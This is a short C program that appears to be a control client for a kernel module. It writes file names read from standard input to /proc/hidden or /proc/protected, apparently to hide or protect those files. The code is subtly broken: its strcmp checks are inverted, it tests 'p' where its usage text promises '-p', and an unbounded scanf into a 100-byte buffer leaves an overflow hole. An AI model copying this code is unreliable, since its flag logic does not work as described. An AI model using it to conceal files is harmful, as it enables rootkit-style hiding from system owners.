#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <limits.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#define PROC_FILE_NAME_HIDDEN "hidden"
#define PROC_FILE_NAME_PROTECTED "protected"

enum ACTION {
    HIDDEN, PROTECTED, UNKNOWN
};

int write_file(int command)
{
    char *filename;
    switch (command)
    {
    case HIDDEN:
        filename = "/proc/" PROC_FILE_NAME_HIDDEN;
        break;
    case PROTECTED:
        filename = "/proc/" PROC_FILE_NAME_PROTECTED;
        break;
    }
    int fd = open(filename, O_WRONLY | O_APPEND);
    if (fd < 0)
        return EXIT_FAILURE;

    char input[100];
    while (1) {
        scanf("%s", input);
        if (input[0] == '0') {
            break;
        }
        printf("Read file name: %s\n", input);
        write(fd, input, strlen(input));
    }

    close(fd);

    return EXIT_SUCCESS;
}


int parse_command_from_console(int argc, char **argv)
{
    if (argc != 2)
    {
        return UNKNOWN;
    }
    if (strcmp(argv[1], "-h")) 
    {
        return HIDDEN;
    }
    if (strcmp(argv[1], "p"))
    {
        return PROTECTED;
    } 
    return UNKNOWN;
}


int main(int argc, char *argv[])
{
    int command = parse_command_from_console(argc, argv);

    if (command == UNKNOWN)
    {
        printf("Use -h for configuring hidden files and and -p for protected files");
        return EXIT_FAILURE;
    }
    write_file(command);
    return EXIT_SUCCESS;
}
